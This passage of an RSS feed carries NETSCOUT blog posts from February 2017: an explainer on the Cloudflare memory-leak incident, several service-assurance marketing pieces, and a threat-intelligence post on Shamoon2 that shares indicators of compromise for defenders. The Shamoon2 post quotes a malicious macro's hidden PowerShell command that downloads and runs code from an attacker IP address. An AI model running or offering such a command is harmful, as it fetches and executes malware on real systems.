<p>Unfortunately, it appears that there was a <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1139" title="Cloudflare Reverse Proxies are Dumping Uninitialized Memory - Project Zero">serious security vulnerability</a> in one of the software components used in CloudFlare’s CDN system which was exposed as CloudFlare were making some alternations to the service late last year. And as a result, it appears that a great deal of information related to CloudFlare-powered Web sites and applications - potentially including usernames, passwords, chat sessions, and other forms of <a href="http://searchfinancialsecurity.techtarget.com/definition/personally-identifiable-information" title="Personally-Identifying Information">personally-identifying information (PII)</a> - has inadvertently leaked from CloudFlare and has been cached by search engines such as Google, Bing, DuckDuckGo and Baidu; privately-run ‘Web scrapers’; and similar services.</p>

<p>That means that this heretofore-private information for millions of Internet users - again, potentially including access credentials - has been available to anyone to stumble across, and possibly exploit.</p>

<p>And it doesn’t really matter whether that information was encrypted via SSL/TLS or not.</p>

<h3>How Did This Happen?</h3>

<p>Whenever one of the CloudFlare CDN reverse-proxies receives an SSL/TLS request, it has to decrypt the request and perform some processing in order to determine how best to service the request. The results of this processing would normally be stored in the operating RAM of the reverse-proxies and then forgotten about (not deleted) as the system moved on to service subsequent requests.&nbsp; A bug in a component of the CloudFlare CDN service stack resulted in some users not only receiving the results they were expecting, but also random memory contents from the CloudFlare reverse-proxies - which could contain everything from other users requests and responses to sensitive information like decrypted passwords and usernames.</p>

<p>Basically, if user <em>A</em> accessed content from server <em>X</em>, user <em>B</em> could, in addition to the expected results from server <em>Y</em>, see what user <em>A</em> got in his responses from server <em>X</em>.&nbsp; Normally, this wouldn’t be an issue as Web browsers would ignore the additional content, and user B would only see his expected results.</p>

<p>However, to improve performance and for purposes of statistical analysis, almost all of the big Web search providers like Google, Bing, Baidu, et. al. will cache and store information on almost all Web servers in the world.&nbsp; This means that when user B did made requests and inadvertently received potentially sensitive information related to user A, the results were often stored in the caches of these popular search engines - and possibly in privately-run Web crawlers, too.</p>

<p>This resulted in the CloudFlare CDN inadvertently leaking random user session information which was subsequently stored by Google and other search providers.&nbsp; This information is readily searchable, and is relatively easy to locate using simple search tools.&nbsp; Google has been actively working with CloudFlare to find this kind of inadvertently-leaked-and-cached sensitive content and are actively working to purge it from the Google cache. It is assumed that other prominent search engine operators are working with CloudFlare to do this on their platforms, as well.</p>

<h3>What Does This Mean to Me?</h3>

<p>As noted previously, many of the most popular Web sites, mobile apps, and related services make use of the CloudFlare CDN service. A programmatically-generated list of the domains for these sites and services may be found <a href="https://github.com/pirate/sites-using-cloudflare" title="Sites Using CloudFlare">here</a>. This handy <a href="https://chrome.google.com/webstore/detail/claire/fgbpcgddpmjmamlibbaobboigaijnmkl" title="Claire Chrome Plug-In">Chrome Web browser plugin</a> will also alert users when they’re browsing a CloudFlare-powered site, and <a href="http://www.doesitusecloudflare.com/" title="Does It Use Cloudflare?">this Web-based utility</a> is also very useful.</p>

<p>Chances are, you’ve used one or more of the sites, services, and/or apps serviced by the CloudFlare CDN, whether you’ve accessed them directly, or whether they’re a dependency of some other site, service, or app you’ve used. Because of the popularity of the CloudFlare CDN service, it’s for all practical purposes impossible for most Internet users to determine whether or not their Web browsing or app traffic has been served by the CloudFlare CDN.</p>

<p>And that’s where the problem lies.</p>

<h3>Change Them All, and Change Them Now!</h3>

<p>For most of us, the only truly safe response to this large-scale information leak is to update our passwords for the Web sites and app-related services we use every day. Pretty much all of them.</p>

<p>Google, Apple, and Microsoft do not appear to utilize the CloudFlare CDN - but unless one has the time, energy, and available to do a detailed analysis of one’s historical Web surfing and app usage over the last several months, it’s better to do a password rotation for all other accounts, just to be on the safe side.</p>

<p>And keep in mind that other types of information may’ve leaked as well - everything from chat logs to email contents to financial information and Web browsing habits. So, while it’s always a good idea to keep a weather eye on one’s online information, increased vigilance in the wake of this mass information leakage is warranted.</p>

<h3>A Rapid Response to a Big, Complex Problem</h3>

<p>Google security researcher <a href="https://twitter.com/taviso" title="Tavis Ormandy">Tavis Ormandy</a> of Google’s <a href="https://googleprojectzero.blogspot.com/" title="Google Project Zero">Project Zero</a> team initially identified this issue and contacted CloudFlare in short order. CloudFlare responded rapidly, and have been working with Google and other organizations to remove as much of the leaked information as possible from Web search engine caches, and have provided a public explanation of how this incident occurred, and the steps they’ve taken to both remediate it and ensure that it doesn’t happen again.</p>

<p>While it’s unfortunate that events of this nature take place, both Google Project Zero and CloudFlare themselves should be commended for taking quick action to resolve the issue to the best of their ability, and in <a href="https://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/" title="Incident report on memory leak caused by Cloudflare parser bug">publicly discussing what took place</a> so that other security researchers - and the Internet community at large - can <a href="https://news.ycombinator.com/item?id=13718752" title="Hacker News - Cloudflare Reverse Proxies Are Dumping Uninitialized Memory ">make their own assessments</a> of the potential impact. It is our hope that more organizations will learn from their example, and move to both remediate and disclose pertinent details of security incidents in a timely and forthright manner.</p>

<h4><em>A Special Note for Arbor Cloud Customers</em></h4>

<p><em>We expect to receive some inquiries as to whether it’s possible that a problem of this sort could arise for sites and services protected by our own Arbor Cloud DDoS mitigation service.</em></p>

<p><em>Because Arbor Cloud is focused strictly on DDoS mitigation and is not a CDN service, it doesn’t perform the same types of operation on customer content and application traffic as does a CDN service like CloudFlare’s. So, this type of issue doesn’t apply to the Arbor Cloud service, nor to Arbor Cloud customers.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">7f8a26ec-31db-46e7-a11b-a77ea36a5a53</guid>
    <pubDate>Fri, 24 Feb 2017 13:09:03 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Building Trust to Build Business</title>
  <link>http://localhost:7996/blog/building-trust-business-user-experience</link>
  <description>Increasing Average Revenue per User (ARPU) and reducing churn, that’s what a service provider cares most about. What does it take to make that happen? Most would say it involves the following: Offering attractive products and services Having a good reputation Delivering quality services that subscriber’s value Maintaining a positive user experience over time Treating customers...</description>
  <content:encoded><![CDATA[<p>Increasing Average Revenue per User (ARPU) and reducing churn, that’s what a service provider cares most about. What does it take to make that happen? Most would say it involves the following:</p>

<ul><li>Offering attractive products and services</li>
	<li>Having a good reputation</li>
	<li>Delivering quality services that subscriber’s value</li>
	<li>Maintaining a positive user experience over time</li>
	<li>Treating customers well</li>
</ul><p>But what is underneath all of these points is creating trust with customers. Creating a positive relationship with a customer is essential to driving business performance and results.</p>

<p>The essence of good relationships is trust. Vulnerability and risk drive trust. What makes someone jump out of a perfectly working airplane on a parachute? Or more appropriate to a service provider, what makes a customer choose and stay with their products and services? What drives trust?</p>

<p>Dr. James Davis in his <a href="https://www.youtube.com/watch?v=s9FBK4eprmA&amp;t=2s" target="_blank">TEDXUSU talk from December 2014 </a>discussed the<strong> “</strong>Three Reasons to Trust” in the context of a customer and a company:</p>

<ul><li>Ability – Can the business do what they say they can do?</li>
	<li>Benevolence – Do they care about me?</li>
	<li>Integrity – Do I agree with their values?</li>
</ul><p>Consumers are becoming increasingly better informed on telecom services through the internet with the ability to easily comparison shop, read reviews and being subject to the viral reach of social media. Service providers may claim they offer the best service (“Can you hear me now?”), but they have to be able to prove it as Net Promoter Scores (NPS) and other surveys and service indicators will influence consumer perceptions.</p>

<p>Another way to influence customer perception is to show how subscribers are treated when there is a problem. Service providers can turn a bad situation into a positive by providing a notice when there is a service issue and an estimate of when the service issue will be fixed. To be able to deliver that level of customer care service providers need an early-warning system that continuously monitors the network, applications, services, and subscribers and provides instant notification (of the service issue), quantification (subscribers/devices impacted) and qualification (what part of the network involved) of service degradation and outages.</p>

<p>Dan Ariely in his TEDx East talk <a href="https://www.youtube.com/watch?v=mwzBJF5Q7Vw&amp;t=73s" target="_blank">“The Value of Trust” from December 2016</a> discussed how to increase Trust through the creation of long-term relationships and reputation. When we are more confident with a company, the more likely we are to buy their products and services, spend more to increase the products and services we have with them. Having a good reputation is something that is earned and must be maintained. Assuring the delivery of high-quality services goes a long way to creating and maintaining that good reputation and upkeep of that subscriber relationship.</p>

<p>People have a tremendous capacity for trust. But if you abuse that trust you may face consequences. Revenge and punishment is how humans deal with a violation of trust. For a service provider that means churn. Dissatisfied subscribers will leave a service provider, and are willing to suffer financial penalties to inflict some measure of revenge on their service provider. And they won’t hesitate to turn to social media to share their story! Indeed, revenge is built into the human psyche; it is a powerful force to get companies to treat customers better.</p>

<p>As we continue our evolution to an electronic society this makes the problem of creating trust more difficult. Faceless transactions do not create a human connection. As Simon Sinek noted in his <a href="https://www.youtube.com/watch?v=4VdO7LuoBzM&amp;t=185s" target="_blank">TEDx Talk (April 2011)</a> also on trust, “technology is absolutely fantastic for the exchange of information and exchange of ideas…its wonderful at resourcing and finding people, but it is terrible at forming human connections, you cannot form trust through the internet.”</p>

<p>Service providers and their customer care departments must recognize that the personal touch still counts for a lot. And as more of the customer interactions are handled through the internet and digital interfaces as part of the evolution of digital transformation, customers may feel alienated from their impersonal interface with the business. Service assurance solutions like <a href="https://www.netscout.com/?ls=PR-MKTG&amp;lsd=blog-022317-1">NETSCOUT</a> provide both proactive <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="ede67472-a71e-43fb-8392-1300a8059391" href="http://localhost:7996/solutions/network-performance-management" target="_blank" title="Network Monitoring">network monitoring</a> for service degradation as well as reactive troubleshooting for individual subscriber sessions. Service providers that leverage these early warning systems to notify customers of service issues (and estimated time to repair) help to mitigate the impersonal feelings of digital transformation.</p>

<p>Service providers offer wanted valuable services with their mobility, internet access, voice, video and data services as well as supporting over-the-top (OTT) applications. With the proper investment and focus on service assurance and business analytics they have the tools to create trust with their subscribers.</p>

<p>If a customer believes in a company, their products, services, reputation, and values then they are willing to take the risk, take the chance, and jump!</p>

<p><strong>For more information on assuring your network services, go to <a href="https://www.netscout.com/">www.netscout.com</a>.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/building-trust.jpg" length="85383" type="image/jpeg"/>
    <guid isPermaLink="false">3c65dd61-64f8-4085-b450-d6ab79f05abe</guid>
    <pubDate>Thu, 23 Feb 2017 09:59:02 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Accelerating Technology Adoption</title>
  <link>http://localhost:7996/blog/accelerating-technology-adoption</link>
  <description>Virtualization is coming or already underway in your network with Network Function Virtualization/Software-defined Network (NFV/SDN). Long-Term Evolution-Advanced (LTE-A) and 5G are the next mobile technology evolutions in the works. And the Internet of Things (IoT) is here and is expected to explode with billions of devices and sensors over the next few years. What is your...</description>
  <content:encoded><![CDATA[<p>Virtualization is coming or already underway in your network with Network Function Virtualization/Software-defined Network (NFV/SDN). Long-Term Evolution-Advanced (LTE-A) and 5G are the next mobile technology evolutions in the works.&nbsp; And the Internet of Things (IoT) is here and is expected to explode with billions of devices and sensors over the next few years.</p>

<p>What is your company doing to accelerate these technology adoptions? Do you have the right tools in place to test and manage the deployment of these technologies with confidence?</p>

<p>Virtualization with the underlying NFV and SDN technology is intended to enable the acceleration of service delivery and increase the agility of service providers as well as potentially reduce OPEX and CAPEX costs. NFV and SDN allow network service components to be spun up (and down) on demand and will support self-optimizing networks. These elastic networks will facilitate self-service of subscribers as operators digitally transform their networks and operations. During this transition service providers need to assure the continued delivery of high-quality services. It is essential to have a seamless service assurance solution for both, legacy or traditional network nodes that will be interconnected with virtualized network functions for some time.</p>

<p>The next generation of LTE, LTE Advanced, is already being deployed by some mobile operators and many are investigating or already starting to work with their vendors on 5G though the standards are not yet formalized and most trials will not begin until 2018. But Network Planning, Operations and Engineering teams have to be looking at the extensibility of their service assurance solutions to handle the expected increase in network capacity and throughput as well as the expanded number of network nodes in the Radio Access Network (RAN) and the ability to handle the virtualization of the RAN with Cloud RAN (C-RAN).</p>

<p>The Internet of Things (IoT) or Internet of Everything (IoE) is already spawning a plethora of devices from wearables, to connected home and industrial sensors, to chat bots and other Artificial Intelligence (AI) and Augmented Reality (AR) devices, and to connected cars and more. Networks and supporting service assurance tools must support not only the explosion of these new devices communicating with each other rather with subscribers, but also allow for the varying latency and priority. These new devices do easily fall into the quality of service settings that have been established for existing voice, video and data services. Networks will have to adapt with new transport delivery schemes and service assurance solutions must accommodate that as well.</p>

<p>Geoffrey Moore created a model for technology adoption with his famous treatise on “Crossing the Chasm.” The first group to embrace new technologies, Early Adopters, are such strong and eager technologists that they deal with the bugs, hiccups, and challenges with new technology. These are the lab and R&amp;D folks that get their hands dirty with new technologies. They need test gear that provides complete visibility down to protocols and hexadecimal code in order to troubleshoot and verify interoperability of network devices.</p>

<p>There is often a significant delay from the Early Adopter phase to the technology acceptance and adoption of the mass market or move to “Main Street” as Moore’s model explains. The time frame to “Cross the Chasm” and gain widespread technology adoption is lengthened by ignorance, lack of stability and poor quality of service of the new technology at that product life stage.</p>

<p>No company wants its reputation stained by poor service and failed technology introductions. In the era of social media, notices of poor service and outages get beamed all over the planet in an instant. Rolling out untested technology can be risky but rolling out technology later than the competition can be very costly. First movers gain brand awareness and recognition as well as capture those early adopter customers.</p>

<p>Ensuring that new technology doesn’t flop is not easy. Early warning systems provide a measure of safety. Using service assurance solutions to manage change control or the introduction of new technology is the first step. Taking a baseline reading of the network before making any change to the network gives Network Operations and Engineering the comparative measure from which to grade the network following a network change. To maintain quality of service after successfully introducing new technologies it is imperative to continuously and holistically monitor the network, service, applications and devices.</p>

<p><a href="https://www.netscout.com/?ls=PR-MKTG&amp;lsd=blog-022217-1">NETSCOUT</a>&nbsp;takes an end-to-end approach to service assurance amid the ongoing network revolution reduces operational complexity, and cost, which leads to increased profitability and improved scalability. Bringing an all-software approach enables services providers to understand, predict, act and automate network functions, which in addition to saving the service provider money, delivers a more valuable experience to the end user.</p>

<p>Technology evolution is increasing in velocity and with it the pressure to adopt. Service assurance solutions have a vital role to play in meeting that challenge.</p>

<p><strong>View:&nbsp;<a href="http://localhost:7996/solutions/wireless-virtualization">www.netscout.com/solutions/wireless-virtualization</a></strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/technology-adoption.jpg" length="416089" type="image/jpeg"/>
    <guid isPermaLink="false">0d44cd67-409b-450a-a331-1e90422e3c67</guid>
    <pubDate>Wed, 22 Feb 2017 09:54:31 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Additional Insights on Shamoon2</title>
  <link>http://localhost:7996/blog/asert/additional-insights-shamoon2</link>
  <description>IBM analysts recently unveiled a first look at how threat actors may have placed Shamoon2 malware on systems in Saudi Arabia. Researchers showcased a potential malware lifecycle which started with spear phishing and eventually led to the deployment of the disk-wiping malware known as Shamoon. Their research showcased a set of downloaders and domains that could potentially lead...</description>
  <content:encoded><![CDATA[<p>IBM analysts recently unveiled a first look at how threat actors may have placed Shamoon2 malware on systems in Saudi Arabia. Researchers showcased a potential malware lifecycle which started with spear phishing and eventually led to the deployment of the disk-wiping malware known as Shamoon. Their research showcased a set of downloaders and domains that could potentially lead to a more extensive malware distribution campaign.</p>

<p>While researching elements in the IBM report, ASERT discovered additional malicious domains, IP addresses, and artifacts. The basic functionality of the new documents and their PowerShell components matched what was previously disclosed. For more information on the overall capabilities of the malware, please review IBM's <a href="https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/">ongoing research</a>.&nbsp; It is our hope that by providing additional indicators, end-point investigators and network defenders will be able to discover and mitigate more Shamoon2 related compromises.</p>

<h2>Initial Discoveries</h2>

<p>The following new samples were likely delivered via similar spear phishing campaigns as described in IBM's research. All three shared the same IPs and URLs, also provided below. These samples were located by pivoting on document attributes. In this case, a sample from the IBM report indicated the document author ‘gerry.knight’ which led us to the following three additional samples.</p>

<p>MD5</p>

<ul>
	<li>2a0df97277ddb361cecf8726df6d78ac 5e5ea1a67c2538dbc01df28e4ea87472 d30b8468d16b631cafe458fd94cc3196</li>
</ul>

<p>IPs</p>

<ul>
	<li>104.218.120[.]128</li>
	<li>69.87.223[.]26</li>
	<li>5.254.100[.]200</li>
</ul>

<p>URLs</p>

<ul>
	<li>analytics-google[.]org:69/checkFile.aspx</li>
	<li>analytics-google[.]org</li>
	<li>69.87.223[.]26:8080/p</li>
</ul>

<p>The following is a screenshot of a macro-enabled document captured from sample 5e5ea1a67c2538dbc01df28e4ea87472:</p>

<p><img alt="" class="aligncenter size-large wp-image-8718" height="518" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/02/Screen-Shot-2017-02-21-at-1.00.06-PM-1024x518.png" width="1024" /> Once enabled the extracted macro executed the following:</p>

<p>'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'<a href="http://69.87.223.26:8080/p">http://69.87.223.26:8080/p</a>\')"'</p>

<h2>Pivoting on Passive DNS</h2>

<p>From the previous samples, we performed a passive DNS lookup on the IPs. We found get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time this campaign was ongoing, November 2016.</p>

<p>Researching the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed yet another iteration of malicious executables. In this case, a URL used to download the PowerShell component shared a naming convention found in the IBM report, http://69.87.223[.]26:8080/<span style="color: #ff0000">eiloShaegae1</span> and connected to the IP address used by the previous three samples. The following are IOCs related to this domain:</p>

<p>MD5</p>

<ul>
	<li>83be35956e5d409306a81e88a1dc89fd</li>
</ul>

<p>IPs</p>

<ul>
	<li>45.63.10[.]99</li>
	<li>69.87.223[.]26</li>
	<li>URLs go-microstf[.]com</li>
	<li>69.87.223[.]26:8080/eiloShaegae1</li>
	<li>go-microstf[.]com/checkfile.aspx</li>
</ul>

<p>The domain go-microstf[.]com was originally set up to spoof Google Analytics login page. The following screenshot is from the malicious domain:</p>

<p><img class="aligncenter wp-image-8719" height="586" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/02/Screen-Shot-2017-02-21-at-1.04.24-PM-300x293.png" width="600" /></p>

<h2>Possible Connections to Iranian state-sponsored Kittens</h2>

<p>Finally, research yielded a relatively unique sample. This particular iteration was submitted to VirusTotal on September 16, 2016. The majority of samples analyzed to date were submitted no earlier than mid-October, with most being submitted in January 2017 or later. We were able to discover this particular version by diving further into connections to analytics-google[.]org. Unlike newer samples, this one created a unique file ‘sloo.exe'. The file was created at C:\Documents and Settings\Admin\Local Settings\Temp\sloo.exe. In addition to this file, the sample also contacted 104.238.184[.]252 for the PowerShell executable.</p>

<p>Researchers at <a href="http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/">Palo Alto have attributed sloo.exe</a> and related activities to threat actors of a likely Iranian state-sponsored origin which they’ve named Magic Hound. The group Magic Hound is linked via infrastructure and tools to the Rocket Kitten threat actor group although Palo Alto cannot confirm the extent of any relationship between the two groups.</p>

<p>Dell Secureworks analysts recently <a href="https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations">concluded</a> that domains discussed in the IBM report were linked to the Iranian PuppyRAT. In addition, Dell analysts have assessed with high-confidence these activities are attributable to Iranian state-sponsored activities.</p>

<p>IOCs for this version were:</p>

<ul>
	<li>MD5 07d6406036d6e06dc8019e3ade6ee7de</li>
</ul>

<p>IPs</p>

<ul>
	<li>104.238.184[.]252</li>
	<li>5.254.100[.]200</li>
	<li>URLs</li>
	<li>analytics-google[.]org:69/checkFile.aspx</li>
</ul>

<h2>Conclusion</h2>

<p>These additional IOCs will hopefully provide more context into the ongoing threat. The link to possible Iranian threat actors supports ongoing analysis that Shamoon2 was perpetrated by Iranian state-sponsored threat actors. The last sample discussed may be malware-0 or at least part of the overall development and subsequent deployment of tools used to install Shamoon on Saudi systems.</p>

<h2>Consolidated IOC list:</h2>

<p>MD5</p>

<ul>
	<li>2a0df97277ddb361cecf8726df6d78ac</li>
	<li>5e5ea1a67c2538dbc01df28e4ea87472</li>
	<li>d30b8468d16b631cafe458fd94cc3196</li>
	<li>83be35956e5d409306a81e88a1dc89fd</li>
	<li>07d6406036d6e06dc8019e3ade6ee7de</li>
</ul>

<p>IPs</p>

<ul>
	<li>104.218.120[.]128</li>
	<li>69.87.223[.]26</li>
	<li>5.254.100[.]200</li>
	<li>45.63.10[.]99</li>
	<li>104.238.184[.]252</li>
</ul>

<p>URLs</p>

<ul>
	<li>analytics-google[.]org:69/checkFile.aspx</li>
	<li>analytics-google[.]org</li>
	<li>69.87.223[.]26:8080/p</li>
	<li>go-microstf[.]com</li>
	<li>69.87.223[.]26:8080/eiloShaegae1</li>
	<li>get.adobe.go-microstf[.]com</li>
	<li>go-microstf[.]com/checkfile.aspx</li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">eafb078b-2f13-4bca-a19e-aa20e40053e7</guid>
    <pubDate>Tue, 21 Feb 2017 17:19:46 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title> Building Trusted Data for Better Business Insights</title>
  <link>http://localhost:7996/blog/building-trusted-data-better-business-insights</link>
  <description>Big Data Analytics users have a rich choice of applications to choose from, but as equally important, it is the choice of data feed(s) that determines the real value of the analytics. Simply said, you cannot have great analytics without smart data! Data quality can be judged by two primary dimensions, data availability and data integrity. Data availability is a function of...</description>
  <content:encoded><![CDATA[<p>Big Data Analytics users have a rich choice of applications to choose from, but as equally important, it is the choice of data feed(s) that determines the real value of the analytics. Simply said, you cannot have great analytics without smart data!</p>

<p>Data quality can be judged by two primary dimensions, data availability and data integrity.  Data availability is a function of coverage (network nodes, applications, devices and the communication protocols utilized), capacity (to handle both peak periods and traffic anomalies), and uptime (the availability of the data gathering instrumentation). With the introduction and evolution of virtualized components the concept of coverage is being extended from traditional network interfaces that can be tapped between “north/south” interfaces to transient virtual machines that result from decomposing a switching function onto a set of compute resources. To gain the requisite visibility instrumentation must be virtualized down to monitor “east/west” traffic of the virtual machine instance and service chains that compose a service.</p>

<p><img alt="business insights" data-entity-type="file" data-entity-uuid="62dec6aa-74e3-4384-b900-a79fc052599f" src="http://localhost:7996/sites/default/files/inline-images/business-insights.png" class="align-right" />Both the instrumentation that collects the raw data and creates metadata, and the analytic applications must have high availability to deliver on data quality. Instrumentation that cannot keep up with traffic rate will drop packets leading to missing and incomplete call records, missed release/error codes, and inaccurate Key Performance Indicators (KPIs) that lead to poor data integrity. A service assurance solution that cannot scale to meet the traffic levels and handle spikes from traffic anomalies becomes merely a “sunshine monitoring system” that can function as long as the network traffic stays within its base operating levels.</p>

<p>Data integrity speaks both to the accuracy and completeness of the data. Other important aspects of data integrity are its timeliness and reliability. Both for performance monitoring, and increasingly for big data analytics, it is essential to have real-time or near real-time data availability of data. Having complete protocol support, session correlation that leads to proper call flow representation and release (error) code mapping are indispensable. The final component that leads to “Smart Data” is in extracting the essential information from the signaling and user plane protocols that imbue the data with the key network, service, subscriber (device) and user experience to make it extensible to both service assurance and business intelligence (and cyber threat security) solutions. <a href="https://www.netscout.com/?ls=PR-MKTG&amp;lsd=blog-022117-1">NETSCOUT</a> has patented its <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="9cfd08af-be74-4c24-8fce-9813b12bf2cd" href="http://localhost:7996/solutions/smart-data" title="Smart Data Analytics">Adaptive Session Intelligence (ASI)</a> to provide highly scalable and real-time metadata continuously derived from packets that is extensible to all network technologies including virtualization and the cloud.</p>

<p>Best practices for configuration and change management can help to ensure end-to-end data quality, availability and integrity. Networks are experiencing unprecedented levels of transformation and an increased rate of change.  4G/LTE were implemented in a fraction of the time mobile operators spent on implementing 2G and 3G networks. 5G appears to be on a further accelerated implementation track. Virtualization is a radical departure from purpose built, specialized and dedicated hardware supporting the delivery of centralized services. Gaining visibility to virtualized elements and traditional network elements is essential for both service assurance and big data analytics.</p>

<p><img alt="managing data" data-entity-type="file" data-entity-uuid="c657038c-ce41-468a-9d77-81a3ad995b04" src="http://localhost:7996/sites/default/files/inline-images/managing-data.png" style="margin-right:20px;" class="align-left" />Managing instrumentation to ensure that it has adequate capacity, probe reconfiguration following changes in network nodes and traffic volumes, and deploying instrumentation to gain visibility to signaling and user plane traffic are all essential to assuring high data availability.</p>

<p>A key product requirement here is auto configuration that utilizes “machine learning” to detect the relevant network interfaces. While change management may be perceived as cost it is essential for both next-gen and legacy networks, such as SS7 that are not possible to auto discover in order to provide end-to-end coverage of the network.</p>

<p>Having a high-data integrity and availability build confidence in business insights or conclusions drawn from data and trust in the decisions that are made and actions taken. To have great analytics you must have SMART data!</p>

<p><strong>Find out more about the value of “smart data” with NETSCOUT at <a href="https://www.netscout.com/">www.netscout.com</a>.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/data-quality.jpg" length="268719" type="image/jpeg"/>
    <guid isPermaLink="false">9b2409c8-d69c-450c-89ba-51b3e6a92b9b</guid>
    <pubDate>Tue, 21 Feb 2017 09:35:06 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Building Trust While Accelerating Network Virtualization</title>
  <link>http://localhost:7996/blog/building-trust-while-accelerating-network-virtualization</link>
  <description>Virtualization (Network Function Virtualization – NFV) is the decomposition and decoupling of network functions from proprietary hardware to enable them to operate on off-the-shelf hardware to more efficiently utilize resources and increase agility in service offerings. This leads to microservices in Virtual Machines (VMs). Orchestration (Software Defined Network – SDN) adds...</description>
  <content:encoded><![CDATA[<p>Virtualization (Network Function Virtualization – NFV) is the decomposition and decoupling of network functions from proprietary hardware to enable them to operate on off-the-shelf hardware to more efficiently utilize resources and increase agility in service offerings. This leads to microservices in Virtual Machines (VMs). Orchestration (Software Defined Network – SDN) adds the ability to automate the management of the network by recognizing the need to spin up or spin down virtual machines in response to traffic levels and support self-service provisioning of subscribers.</p>

<p>Studies by ACG Research and Analysys Mason on the benefits of virtualization of the VoLTE network showed these findings:</p>

<p>Services are created faster via software integration<sup style="vertical-align:super; font-size:smaller">1</sup></p>

<p>Time-to-market averages: 15 months to 6 months<sup style="vertical-align:super; font-size:smaller">1</sup></p>

<p>Overall savings of 33%<sup style="vertical-align:super; font-size:smaller">2</sup></p>

<p>While the promise of NFV/SDN is to reduce costs and increase service velocity it creates new challenges for service providers to maintain service quality during this transition. Monitoring dynamic virtual/ hybrid networks introduces a whole new level of complexity. There is a feeling of having even less control due to lack of visibility to transient VNFs. So the challenge is creating visibility to a virtualized infrastructure and providing seamless visibility across both virtual and physical network infrastructures.</p>

<p><img alt="Network Virtualization" data-entity-type="file" data-entity-uuid="87f62acb-c477-4349-9d7f-02164dca5ddc" src="http://localhost:7996/sites/default/files/inline-images/NetworkVirutalization.png" class="align-right" />Service assurance solutions are needed that holistically support hybrid networks with:</p>

<p>1) Visibility – down to VNF but with context of service and subscribers</p>

<p>2) Scalability – Carrier scalability for an NFV solution with real-time performance</p>

<p>3) TCO – Hardware is not free! The software solution must be optimized for the hardware footprint</p>

<p>Elastic and scalable monitoring solution dynamically allocated through the Orchestration layer. The virtual instrumentation follows the individual VNFs as they “spin up” and “spin down,” following “service chains” that compose the VNFs, and follow the interaction of the virtualized network components with the traditional physical network components.</p>

<p>Virtualized network functions means having holistic coverage for both north/south and east/west traffic. The “east/west” traffic coverage means having a virtualized probe that sits atop the hypervisor. With the virtual probe producing real-time information, that is needed for monitoring the “spin up” and “spin down” of VNFs, there comes the capability to provide its information as a feedback loop for the orchestration layer. To minimize the utilization of server resources the virtual probe (vprobe) must be built for software-only performance or else you will have to employ more hardware to accommodate performance monitoring (as Commercial off-the-shelf (COTS) hardware is not free!) And finally, the service assurance solution must support multi-tenancy to separate the respective traffic visibility that is inherent in virtualized resources.</p>

<p>Service providers cannot afford to lose visibility to virtual elements. Networks with VNFs that fluctuate in response to demand require a tool that can detect and resolve network and policy conflicts. To deploy virtualization with confidence and trust that these virtualized components deliver quality services, carriers need a solution that provides a comprehensive view of real-time traffic between migrating VNFs. Carriers need a single toolset with end-to-end correlation between physical and virtual network elements, allowing you to see the complete network picture.</p>

<p><a href="http://serviceprovider.netscout.com/solutions/virtualization/?ls=PR-MKTG&amp;lsd=blog-022017-1" target="_blank">NFV: SEE WHAT’S REALLY HAPPENING ACROSS YOUR ENTIRE NETWORK</a></p>

<p><sup style="vertical-align:super; font-size:smaller">1</sup>Source: ACG Research, July 2015</p>

<p><sup style="vertical-align:super; font-size:smaller">2</sup>Source: Analysys Mason, June 2015; savings realized with virtualized IMS adoption for VoLTE.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/network_virtualization.jpg" length="390465" type="image/jpeg"/>
    <guid isPermaLink="false">df864842-0524-43f3-bb8f-69312c85be6a</guid>
    <pubDate>Mon, 20 Feb 2017 09:15:01 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title> Building Trust with Customers</title>
  <link>http://localhost:7996/blog/building-trust-customers</link>
  <description>Trust may seem like an unusual word to use when discussing the relationship with your communications service provider. But trust is a vital part of a business relationship. If I am going to spend my money with a business, I trust that their products and services will do what they say they will, that they are priced reasonably, and that they will take care of me as a customer...</description>
